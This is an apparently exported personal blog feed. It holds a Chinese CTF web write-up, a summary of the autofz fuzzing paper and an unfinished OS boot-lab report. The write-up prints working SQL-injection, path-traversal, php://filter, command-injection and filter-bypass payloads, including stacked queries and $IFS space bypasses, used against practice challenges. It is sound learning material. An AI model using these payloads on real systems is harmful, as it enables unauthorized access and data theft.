<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>WebWriteUp1</title>
    <link href="/2024/01/24/WebWriteUp/"/>
    <url>/2024/01/24/WebWriteUp/</url>
    
    <content type="html"><![CDATA[<h4 id="EasySQL（极客大挑战）"><a href="#EasySQL（极客大挑战）" class="headerlink" title="EasySQL（极客大挑战）"></a>EasySQL（极客大挑战）</h4><p><img src="/2024/01/24/WebWriteUp/image-20240124190853709.png" alt="image-20240124190853709"></p><p>先输入用户名1和密码1</p><p><img src="/2024/01/24/WebWriteUp/image-20240124190942891.png" alt="image-20240124190942891"></p><p>可以看出是通过GET方法传输数据</p><p>尝试输入1’进行测试</p><p>得到报错：<img src="/2024/01/24/WebWriteUp/image-20240124193114395.png" alt="image-20240124193114395"></p><p>这说明是查询语句中是存在一个单引号的，为单引号闭合，那么则构造payload</p><p><code>1&#39;or 1=1 #</code></p><p>填在用户名处（或直接修改），密码任意，因为被#注释掉了</p><p><img src="/2024/01/24/WebWriteUp/image-20240124193458266.png" alt="image-20240124193458266"></p><p>成功绕过</p><h4 id="HaveFun"><a href="#HaveFun" class="headerlink" title="HaveFun"></a>HaveFun</h4><p><img src="/2024/01/24/WebWriteUp/image-20240124195701183.png" alt="image-20240124195701183"></p><p>进来发现啥也没有，那么查看源码</p><p><img src="/2024/01/24/WebWriteUp/image-20240124195736363.png" alt="image-20240124195736363"></p><p>通过Get方法获得参数，并存放在cat中，判断该值是否等于dog，那么构造payload</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200024766.png" alt="image-20240124200024766"></p><p>获得flag</p><h4 id="Warm-Up"><a href="#Warm-Up" class="headerlink" title="Warm Up"></a>Warm Up</h4><p><img src="/2024/01/24/WebWriteUp/image-20240124200118945.png" alt="image-20240124200118945"></p><p>进来就是这个抽象笑脸，啥也没有，题目里有tag：php，代码审计，那么查看源码</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200330278.png" alt="image-20240124200330278"></p><p>查看source.php（直接改url）</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200411693.png" alt="image-20240124200411693"></p><p>看到还有个hint.php，也打开看一下</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200528267.png" alt="image-20240124200528267"></p><p>只有这么一句话</p><p>还是重点看source.php</p><p>这段代码就是，对用户请求的文件进行安全检查，如果通过安全检查，且在白名单中，则通过include方法包含这个文件，且能得到以下条件：</p><ol><li>设置了一个白名单，只包含source.php和hint.php，第一个if检查是否存在$page并且是否为字符串。</li><li>检查$page是否在白名单中，是的话返回true。接下来，两个函数一个<a href="https://www.php.net/manual/zh/function.mb-substr.php">mb_substr</a>和<a href="https://www.php.net/manual/zh/function.mb-strpos.php">mb_strpos</a>，总的意思就是截取变量page中?前面的字符串，然后再进行白名单校验。</li><li>在url解码后的$page的?前面是否在whitelist里面</li></ol><p>所以构造payload</p><p><code>source.php?file=hint.php?ffffllllaaaagggg</code></p><p>发现，图片消失了，那么说明payload是正确的，那么进行目录穿越找文件</p><p>修改payload（实际五层时就能找到）</p><p><code>source.php?file=hint.php?../../../../../../ffffllllaaaagggg</code></p><p><img src="/2024/01/24/WebWriteUp/image-20240124202309328.png" alt="image-20240124202309328"></p><p>得到flag</p><h4 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h4><p>根据题目猜测是文件包含漏洞</p><p>文件包含漏洞成因：</p><p>为了灵活的包含文件，将被包含文件设置为变量，通过动态变量引入需要包含的文件时，用户对变量的可控而服务器端未对变量值合理的校验或被绕过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">include() <span class="hljs-comment">// 找不到被包含文件时产生警告，脚本继续执行</span><br><br>include_once() <span class="hljs-comment">// 与include类似，但如果该文件的代码已经被包含，则不会再次包含</span><br><br>require() <span class="hljs-comment">// 找不到被包含文件时产生错误，脚本停止</span><br><br>require_once() <span class="hljs-comment">// 与require类似，但如果该文件的代码已经被包含，则不会再次包含</span><br></code></pre></td></tr></table></figure><p>文件包含漏洞利用：</p><p>windows常见敏感信息</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185135302.png" alt="image-20240125185135302"></p><p>linux常见敏感信息</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185152901.png" alt="image-20240125185152901"></p><p>伪协议</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185254233.png" alt="image-20240125185254233"></p><p>首先先尝试暴力找几层，看看是否存在flag.php之类的文件，发现没有</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185430312.png" alt="image-20240125185430312"></p><p><img src="/2024/01/24/WebWriteUp/image-20240125185446011.png" alt="image-20240125185446011"></p><p>啥也没有，尝试用php伪协议看一眼flag.php的源码</p><p>payload如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>得到一串base64加密的字符串</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185625571.png" alt="image-20240125185625571"></p><p>解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;9a011d4ae-cab3-4cc3-90c5-297288f0189b&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Eexc"><a href="#Eexc" class="headerlink" title="Eexc"></a>Eexc</h4><p>这是一道命令注入题</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195121169.png" alt="image-20240125195121169"></p><p>随便输了个1，发现居然能ping通</p><p>那么修改payload为：1;ls</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195228705.png" alt="image-20240125195228705"></p><p>继续查看上级目录：1;ls ..&#x2F;</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195404097.png" alt="image-20240125195404097"></p><p>再查看上一级</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195436474.png" alt="image-20240125195436474"></p><p>找到flag，用cat命令查看</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195526719.png" alt="image-20240125195526719"></p><h4 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h4><p><img src="/2024/01/24/WebWriteUp/image-20240126150517909.png" alt="image-20240126150517909"></p><p>进来发现只有个这个，那推测跟上一题类似，也是一道命令注入题</p><p>构造payload：</p><p>&#x2F;?ip&#x3D;127.0.0.1</p><p><img src="/2024/01/24/WebWriteUp/image-20240126150625427.png" alt="image-20240126150625427"></p><p>能ping通</p><p>那么还是一样的套路，修改payload为：&#x2F;?ip&#x3D;127.0.0.1;ls</p><p><img src="/2024/01/24/WebWriteUp/image-20240126150732541.png" alt="image-20240126150732541"></p><p>利用cat命令查看</p><p><img src="/2024/01/24/WebWriteUp/image-20240126150755178.png" alt="image-20240126150755178"></p><p>应该是过滤了空格</p><blockquote><p>过滤空格的方法有：</p><p>$IFS</p><p>${IFS}</p><p>$IFS$(任意数字)， 如：$IFS$1</p><p>&lt;</p><p>&lt;&gt;</p><p>{cat, flag.php}</p><p>%20</p><p>%09</p></blockquote><p>尝试payload: &#x2F;?ip&#x3D;127.0.0.1;cat$IFSflag.php</p><p><img src="/2024/01/24/WebWriteUp/image-20240126151216802.png" alt="image-20240126151216802"></p><p>那应该是有更多的过滤手段，再看看index.php中有啥</p><p><img src="/2024/01/24/WebWriteUp/image-20240126151540171.png" alt="image-20240126151540171"></p><p>这段代码的作用：</p><ol><li>检查变量 <code>$ip</code> 中是否包含一些特殊字符。如果 <code>$ip</code> 中包含其中任何一个字符，代码将输出匹配的字符数（由 参数 <code>$match</code> 传递），然后输出 “fxck your symbol!” 并结束程序。</li><li>检查是否有空格在变量 <code>$ip</code> 中。如果有空格，输出 “fxck your space!” 并结束程序。</li><li>检查 <code>$ip</code> 中是否包含字符串 “bash”。如果包含，输出 “fxck your bash!” 并结束程序。</li><li>检查 <code>$ip</code> 中是否包含字符串 “flag”，如果包含，输出 “fxck your flag!” 并结束程序</li><li>如果通过了所有的检查，使用 <code>shell_exec</code> 函数执行 ping 命令。这里是执行 <code>ping -c 4</code> 命令，其中 <code>-c 4</code> 表示发送四个 ICMP 包。</li></ol><p>那么显然，可以尝试拼接的方式被限制的关键词flag</p><p>构造payload：&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;ag;cat$IFS$1fl$a.php，得到flag</p><p><img src="/2024/01/24/WebWriteUp/image-20240126153519187.png" alt="image-20240126153519187"></p><h4 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h4><p><img src="/2024/01/24/WebWriteUp/image-20240126154133769.png" alt="image-20240126154133769"></p><p>Submit一下</p><p><img src="/2024/01/24/WebWriteUp/image-20240126154325513.png" alt="image-20240126154325513"></p><p>尝试sql注入</p><p><strong>首先判断是字符型还是数字型</strong></p><p><img src="/2024/01/24/WebWriteUp/image-20240126154658007.png" alt="image-20240126154658007"></p><p><img src="/2024/01/24/WebWriteUp/image-20240126154634784.png" alt="image-20240126154634784"></p><p>两次都有回显，说明是字符型注入</p><p>接着<strong>查询字段数</strong>：</p><p><img src="/2024/01/24/WebWriteUp/image-20240126154809129.png" alt="image-20240126154809129"></p><p>查到第三次发现：</p><p><img src="/2024/01/24/WebWriteUp/image-20240126154847897.png" alt="image-20240126154847897"></p><p>说明有两个字段</p><p><strong>确定字段的显示顺序</strong></p><p><img src="/2024/01/24/WebWriteUp/image-20240126155713350.png" alt="image-20240126155713350"></p><p>说明select被过滤掉了</p><p>（这里不会了，看题解，说是要用堆叠注入，堆叠注入相关笔记单独整理）</p><p>爆破数据库</p><p><img src="/2024/01/24/WebWriteUp/image-20240126193749558.png" alt="image-20240126193749558"></p><p>尝试爆表</p><p><img src="/2024/01/24/WebWriteUp/image-20240126193856592.png" alt="image-20240126193856592"></p><p>构造payload查看第一个表1919810931114514</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;; show columns <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>这里要注意，表名为数字时，要用反引号括起来，同时需要在最后加#屏蔽掉其他查询语句</p><p><img src="/2024/01/24/WebWriteUp/image-20240126195918958.png" alt="image-20240126195918958"></p><p><strong>方法一</strong></p><p>因为select被过滤掉了，那么则可以对 </p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-meta">#;</span><br></code></pre></td></tr></table></figure><p>进行16进制编码，然后构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">SeT</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="hljs-keyword">prepare</span> execsql <span class="hljs-keyword">from</span> <span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span> execsql;#<br></code></pre></td></tr></table></figure><ul><li>prepare…from…是预处理语句，会进行编码转换。</li><li>execute用来执行由SQLPrepare创建的SQL语句。</li><li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</li></ul><p><img src="/2024/01/24/WebWriteUp/image-20240126205028096.png" alt="image-20240126205028096"></p><p><strong>方法二</strong></p><p>构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/24/WebWriteUp/image-20240126211244718.png" alt="image-20240126211244718"></p><p>在MySQL中，<code>HANDLER</code>语句用于通过存储引擎直接操作表的数据，而不是使用标准的SQL查询语句。可以以更底层的方式对表进行读写操作，绕过SQL解释器。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>autofz</title>
    <link href="/2024/01/24/autofz/"/>
    <url>/2024/01/24/autofz/</url>
    
    <content type="html"><![CDATA[<h2 id="autofz-Automated-Fuzzer-Composition-at-Runtime"><a href="#autofz-Automated-Fuzzer-Composition-at-Runtime" class="headerlink" title="autofz: Automated Fuzzer Composition at Runtime"></a>autofz: Automated Fuzzer Composition at Runtime</h2><p>作者：Yu-Fu Fu &#x2F; Jaehyuk Lee &#x2F; Taesoo Kim</p><p>学校或机构：Georgia Institute of Technology（佐治亚理工学院）</p><h4 id="选择负担"><a href="#选择负担" class="headerlink" title="选择负担"></a>选择负担</h4><p><strong>什么是选择负担</strong></p><p>模糊测试由于开发多样化的模糊测试工具而变得越来越受欢迎，特别是在软件漏洞检测方面。由于各种模糊测试技术的应用，大多数模糊测试工具在其选择的目标上表现出色。然而，模糊测试工具的多样性也使得难以选择最适合复杂实际程序的模糊测试工具，称之为<strong>选择负担</strong>。社区尝试通过创建一组标准基准来解决这个问题，以比较和对比模糊测试工具在各种应用程序上的性能，但结果总是一个次优的决策——平均性能最佳的模糊测试工具并不保证对用户关注的目标产生最佳结果。</p><p><strong>当前解决策略</strong></p><ul><li>模糊测试基准Fuzzing benchmarks（如Magma，Lava，ProFuzzBench）列举了每个基准目标的适用的模糊测试工具。</li><li>协作模糊测试，通过合作使用不同组合的模糊测试工具，通过多个模糊测试器的语料库共享提升整体性能。但在模糊测试器的选择依赖于静态分析的结果，依然需要大量的计算和人力资源，同时，如何为多个模糊测试器分配合理的资源也会影响整体的效果</li></ul><p><strong>autofz解决思路</strong></p><blockquote><p>Unlike previous works, autofz automatically deploys a set of fuzzer(s) per workload, not per program.</p></blockquote><p>不像其他fuzzer，autofz并不是为整个程序，而是为每个工作负载部署一套模糊测试工具，autofz 的目标是通过对模糊测试工具的动态组合实现选择问题的完全自动化，成为一种一键解决方案。</p><h4 id="autofz"><a href="#autofz" class="headerlink" title="autofz"></a>autofz</h4><p><strong>trend（趋势）</strong></p><p>将基准模糊测试工具的运行时进展称为趋势，autofz在整个执行过程中会随着趋势的变化而切换模糊测试工具并调整资源，而不是在执行期间坚持使用一组特定的模糊测试工具。</p><p><strong>工作原理</strong></p><p>准备阶段：</p><p>捕获目标二进制文件的运行时趋势，并部署展示强趋势的模糊测试工具</p><p>聚焦阶段：</p><p>基于捕获的趋势和指导信息，聚焦阶段尝试通过选定的模糊测试工具实现最佳性能。此外，autofz 利用指导信息的动态资源调整使其能够兼顾个体模糊测试工具和不同模糊测试工具组合的优势。一方面，它可以优先考虑某个模糊测试工具，通过将所有资源分配给选定的模糊测试工具，显著优于其他工具。另一方面，autofz 通过分配资源充分利用多个模糊测试工具。</p><p><img src="/2024/01/24/autofz/image-20240125102248335.png" alt="image-20240125102248335"></p><ol><li>为了公平进行模糊测试效果的比较，在第一步先进行种子的同步，同时为所有基准模糊测试工具分配相同数量的资源（1）</li><li>然后每个模糊测试器轮流以非常短的时间间隔运行，直到达到退出条件（退出条件将在后边详细说明）然后通过AFL Bitmap衡量每个模糊测试器的运行效果。（2，3）</li><li>根据趋势，决定每个模糊测试工具在当前工作负载下的优先级以及资源分配元数据（4）</li><li>对分配的CPU核心进行时间切片（作用还没想明白）（5）</li><li>过渡到聚焦阶段的时候在进行种子同步（6，7），允许被选择的模糊测试器共享准备阶段可能产生的独特测试用例</li><li>进入聚焦阶段，按照资源分配元数据一次运行所选的模糊测试工具，为每个工具分配特定的CPU时间窗口（8）</li><li>此时聚焦阶段目的是实现最大性能，所以会在一个在一个模糊测试工具执行后，我们同步种子，以允许剩余的模糊测试工具通过其他模糊测试工具探索未发现的路径。当分配的全部资源被消耗完毕时，它回到准备阶段并测量趋势（9）</li><li>两个阶段轮流执行，知道模糊测试执行终止</li></ol><h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a><strong>难点</strong></h4><p><strong>准备时间</strong></p><p>准备阶段的时间选择至关重要，如果准备阶段的时间过短，很难捕获到模糊测试工具的明显趋势，导致最后选取的工具集并不是最优的；但准备时间过长，则有可能造成资源的浪费，同时使整个实验的周期延长。为了避免引入另一种手动确定适当时间预算的方法，autofz引入了动态准备时间。</p><p>为了实现这一点，autofz首先在运行时计算位图的峰值差异，当差异大于定义的阈值时，可以允许准备阶段提前退出，然后直接进入聚焦阶段，多余的资源同样也被委托给聚焦阶段。阈值可以由用户进行初始配置（θinit）。然而，autofz会自动调整初始配置并找到每个目标的最佳阈值，从而消除了另一种手动努力。阈值会在每个准备阶段之后的每一轮进行校准。具体而言，如果发生提前退出，autofz将通过θinit增加阈值（θcur）。否则，它将θcur除以二。这种设计背后的原理是随着模糊测试活动的进行，总体上其进展逐渐减缓。在其早期阶段，由于以合法种子作为其初始输入，所选的模糊测试工具通常会产生相当大的进展。因此，如果阈值过小，它将很容易被越过，autofz可能会做出次优的决策。相反，随着模糊测试活动的进行，每个模糊测试工具产生的进展很容易饱和，探索新路径变得困难。</p><p><strong>如何衡量趋势</strong></p><p>由于进行了种子的同步，所以，可以将运行时，每个模糊测试工具能探索的独特的路径视作其贡献，即找到所有工具的共同路径，然后把这些路径从位图中减掉，比较贡献大小</p><p><strong>资源分配</strong></p><p>autofz支持两种资源分配策略</p><ol><li>优先考虑最佳性能，将所有资源分配给排名最高的模糊测试工具。仅当某个模糊测试工具明显优于所有其他基准模糊测试工具时，才激活此策略</li><li>根据每个模糊测试工具的趋势进行比例分配资源。请注意，每个基准模糊测试工具的贡献是基于它发现的唯一路径进行评估的。因此，如果在准备阶段捕获到多个强烈趋势，这很大程度上表明准备阶段找到了多个有利于模糊测试程序不同部分的模糊测试工具。在这种情况下，我们根据它们的贡献比例分配资源，并实现协作模糊测试的好处。</li></ol><h4 id="实验实施"><a href="#实验实施" class="headerlink" title="实验实施"></a><strong>实验实施</strong></h4><p><strong>实验环境</strong></p><p>在配备 AMD Ryzen 9 3900 的 Ubuntu 20.04 上进行实验，内存为 24 个，内存为 32 GB。为了将autofz与CUPID和ENFUZZ进行比较，将多个CPU内核分配给Docker容器。将 autofz 与单个 fuzzer 进行比较的其他评估是使用容器执行的，容器分配一个 CPU 内核，而不会限制内存。由于兼容性，所有容器运行 Ubuntu 16.042。</p><p><strong>基准模糊器选择</strong></p><p>autofz 使用了所有支持 Fuzzer Test Suite 和 UNIFUZZ 的模糊测试器，同时支持CUPID和ENFUZZ中采用的所有模糊测试器进行公平比较</p><blockquote><p><strong>Fuzzer Test Suite（FTS）</strong>：</p><p>Fuzzer Test Suite 包括一系列标准化的测试用例和目标程序，用于模糊测试工具的性能评估。这些测试用例可能涉及不同类型的二进制文件和应用程序，旨在覆盖多个应用场景。FTS 的目标是提供一个一致的基准，以便研究人员和开发人员能够有效地评估不同模糊测试工具的表现。</p><p><strong>UNIFUZZ</strong>：</p><p>UNIFUZZ 是一个开源的、集成化的模糊测试解决方案，专注于提供可扩展和易用的模糊测试环境。它为研究人员和开发人员提供了一整套工具，包括各种先进的模糊测试工具、资源管理、结果分析等功能。</p><p><strong>CUPID：</strong></p><p>CUPID 是一个协同模糊测试平台，旨在通过协同不同类型的模糊器以提高模糊测试活动的性能。它通过种子同步等方法，协同运行多个模糊器，以期获得更好的代码覆盖率和更高的漏洞发现率。</p><p><strong>ENFUZZ：</strong></p><p>ENFUZZ 是一个演化神经模糊系统，专注于无监督区域完成。它结合了演化算法和神经模糊系统的思想，通过进化的方式改进模糊测试过程，提高模糊测试的效率和效果。</p></blockquote><p><strong>目标二进制文件和种子</strong></p><p>将autofz集成到了UNIFUZZ和FTS中，使用真实的程序评估autofz</p><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p><img src="/2024/01/24/autofz/image-20240126215138099.png" alt="image-20240126215138099"></p><p>横坐标是运行时间，纵坐标是位图覆盖率</p><p>可以看出，autofz的效果基本都优于单个模糊测试器，且随着运行时间推移，效果会越来越好。只在pdftotext这里输给了RedQueen</p><p><img src="/2024/01/24/autofz/image-20240126220213062.png" alt="image-20240126220213062"></p><p>本文引入了CD图（）UNIFUZZ 中目标的关键差异。每个数字表示模糊器的平均排名。每个粗体线表示根据 按该行分组的模糊器之间的性能差异没有统计学意义。这里可以看出，平均而言，UNIFUZZ 和 FTS 中的 autofz 排名分别为 1.22 和 1.2，性能优于别的单个模糊器</p><p><img src="/2024/01/24/autofz/image-20240126222155028.png" alt="image-20240126222155028"></p><p>与别的模糊器协作方法比较，横坐标是CPU时间</p><p>autofz-6 &#x3D; [AFL, FairFuzz, QSYM, AFLFast, LAF-INTEL, Radamsa]</p><p>CUPID-4 and ENFUZZ-Q &#x3D; [AFL, FairFuzz, QSYM, AFLFast]</p><p>autofz-10 &#x3D; [All baseline fuzzers described in except libFuzzer]</p><p>可以看出，在面对不同的模糊器选择策略时（但组合固定）时，autofz所提供的自动选择最佳性能模糊测试器的方法有显著的效果</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OSlab1</title>
    <link href="/2023/11/29/OSlab1/"/>
    <url>/2023/11/29/OSlab1/</url>
    
    <content type="html"><![CDATA[<h2 id="OS-lab1-Booting-a-PC"><a href="#OS-lab1-Booting-a-PC" class="headerlink" title="OS  - lab1 Booting a PC"></a>OS  - lab1 Booting a PC</h2><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a><strong>实验目的：</strong></h3><ul><li>熟悉QEMU，了解PC开机程序</li><li>探究6.828的内核加载过程，了解开机后，内核是如何加载到内存并运行的</li><li>探究6.828内核的基本结构</li></ul><h3 id="第一部分：PC-Bootstrap"><a href="#第一部分：PC-Bootstrap" class="headerlink" title="第一部分：PC Bootstrap"></a>第一部分：PC Bootstrap</h3><p><img src="/2023/11/29/OSlab1/image-20231130154817983.png" alt="image-20231130154817983"></p><p>第一代PC处理器是16位字长的Intel 8088处理器，但其地址总线有20位，所以能够实现1MB的寻址（<strong>段寄存器中的值左移4位，形成20位段基址，然后和16位段内偏移相加</strong>），即0x00000000 - 0x000FFFFF，但也只有640KB是用户可用的，剩下的空间用作其他目的，如图所示。其中最重要的是BIOS ROM，BIOS负责进行一些基本的系统初始化任务，比如开启显卡，检查系统的内存大小等工作。在初始化完成之后，从合适的地方加载操作系统。</p><p>虽然Intel处理器突破了1MB内存空间，在80286和80386上已经实现了16MB，4GB的地址空间，但是PC的架构必须仍旧把原来的1MB的地址空间的结构保留下来，这样才能实现向后兼容性。所以现代计算机的地址 0x000A0000<del>0x00100000区间是一个空洞，不会被使用。因此这个空洞就把地址空间划分成了两个部分，第一部分就是从0x00000000</del>0x000A0000，叫做传统内存。剩下的不包括空洞的其他部分叫做扩展内存。而对于这种32位字长处理器通常把BIOS存放到整个存储空间的顶端处。</p><p><img src="/2023/11/29/OSlab1/image-20231130161251088.png" alt="image-20231130161251088"></p><h3 id="第二部分：The-Boot-Loader"><a href="#第二部分：The-Boot-Loader" class="headerlink" title="第二部分：The Boot Loader"></a>第二部分：The Boot Loader</h3><h4 id="练习2"><a href="#练习2" class="headerlink" title="练习2:"></a>练习2:</h4><p>使用gdb的<code>si</code>（单步调试）命令进入ROM BIOS并追踪几条指令，并猜测这些指令的作用。不需要指出指令具体的细节，只要理解BIOS一开始运行的核心思想而已。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[f000:fff0]    0xffff0: ljmp   $0xf000,$0xe05b # 跳到一个较早的位置<br>[f000:e05b]    0xfe05b: cmpl   $0x0,%cs:0x6ac8<br>[f000:e062]    0xfe062: jne    0xfd2e1         # 测试cs段的0x6ac8字是否为0        <br>[f000:e066]    0xfe066: xor    %dx,%dx         # 把dx寄存器清零<br>[f000:e068]    0xfe068: mov    %dx,%ss         <br>[f000:e06a]    0xfe06a: mov    $0x7000,%esp    <br>[f000:e070]    0xfe070: mov    $0xf34c2,%edx   <br>[f000:e076]    0xfe076: jmp    0xfd15c         <br>[f000:d15c]    0xfd15c: mov    %eax,%ecx       <br>[f000:d15f]    0xfd15f: cli                    # 关闭硬件中断<br>[f000:d160]    0xfd160: cld                    # 设置串传送指令方向<br>[f000:d161]    0xfd161: mov    $0x8f,%eax      <br>[f000:d167]    0xfd167: out    %al,$0x70       <br>[f000:d169]    0xfd169: in     $0x71,%al       # 关闭不可屏蔽中断，70，71端口用于控制CMOS，操作CMOS存储器中的内容需要两个端口，一个是0x70另一个就是0x71。其中0x70可以叫做索引寄存器，这个8位寄存器的最高位是不可屏蔽中断(NMI)使能位。如果你把这个位置1，则NMI不会被响应。低7位用于指定CMOS存储器中的存储单元地址<br>[f000:d16b]    0xfd16b: in     $0x92,%al       # 读取系统控制端口A<br>[f000:d16d]    0xfd16d: or     $0x2,%al        <br>[f000:d16f]    0xfd16f: out    %al,$0x92       # 通过快速A20以启动A20<br>[f000:d171]    0xfd171: lidtw  %cs:0x6ab8      # 将cs:0x6ab8加载进入IDT表<br>[f000:d177]    0xfd177: lgdtw  %cs:0x6a74      # 将cs:0x6a74加载进入GDT表<br>[f000:d17d]    0xfd17d: mov    %cr0,%eax   <br>[f000:d180]    0xfd180: or     $0x1,%eax       <br>[f000:d184]    0xfd184: mov    %eax,%cr0       # 将cr0寄存器的保护模式位打开<br>[f000:d187]    0xfd187: ljmpl  $0x8,$0xfd18f   # 通过ljmp指令进入保护模式<br>=&gt; 0xfd18f:     mov    $0x10,%eax              # 设置段寄存器<br>=&gt; 0xfd194:     mov    %eax,%ds<br>=&gt; 0xfd196:     mov    %eax,%es  <br>=&gt; 0xfd198:     mov    %eax,%ss<br>=&gt; 0xfd19a:     mov    %eax,%fs<br>=&gt; 0xfd19c:     mov    %eax,%gs<br>=&gt; 0xfd19e:     mov    %ecx,%eax  <br>=&gt; 0xfd1a0:     jmp    *%edx                   # 跳转<br></code></pre></td></tr></table></figure><p>总的来说，BIOS的操作就是在控制，初始化，检测各种底层的设备，比如时钟，GDTR寄存器。以及设置中断向量表。</p><h4 id="练习3"><a href="#练习3" class="headerlink" title="练习3:"></a>练习3:</h4><p>设置一个断点在地址0x7c00处，这是boot sector被加载的位置。然后让程序继续运行直到这个断点。跟踪&#x2F;boot&#x2F;boot.S文件的每一条指令，同时使用boot.S文件和系统为你反汇编出来的文件obj&#x2F;boot&#x2F;boot.asm。你也可以使用GDB的x&#x2F;i指令来获取去任意一个机器指令的反汇编指令，把源文件boot.S文件和boot.asm文件以及在GDB反汇编出来的指令进行比较。</p><p>追踪到bootmain函数中，而且还要具体追踪到readsect()子函数里面。找出和readsect()c语言程序的每一条语句所对应的汇编指令，回到bootmain()，然后找出把内核文件从磁盘读取到内存的那个for循环所对应的汇编语句。找出当循环结束后会执行哪条语句，在那里设置断点，继续运行到断点，然后运行完所有的剩下的语句。</p><p><img src="/2023/11/29/OSlab1/image-20231202231040821.png" alt="image-20231202231040821"></p><p><img src="/2023/11/29/OSlab1/image-20231203100345159.png" alt="image-20231203100345159"></p><p>当BIOS运行完毕之后，cpu的控制权就会转移到boot.S上，所以分析boot.S，通过介绍可以看出，boot.S的总体作用是将实模式切换为保护模式</p><h5 id="Boot-S"><a href="#Boot-S" class="headerlink" title="Boot.S"></a>Boot.S</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl start<br>start:<br>  .code16                     # Assemble for 16-bit mode<br>  cli                         # Disable interrupts<br>  cld                         # String operations increment<br><br>  # Set up the important data segment registers (DS, ES, SS).<br>  xorw    %ax,%ax             # Segment number zero<br>  movw    %ax,%ds             # -&gt; Data Segment<br>  movw    %ax,%es             # -&gt; Extra Segment<br>  movw    %ax,%ss             # -&gt; Stack Segment<br></code></pre></td></tr></table></figure><p>cli用于关闭所有中断，cld用于指定串处理操作的指针移动方向，接下来是吧ds，es，ss全部清零，为后边进入保护模式做准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 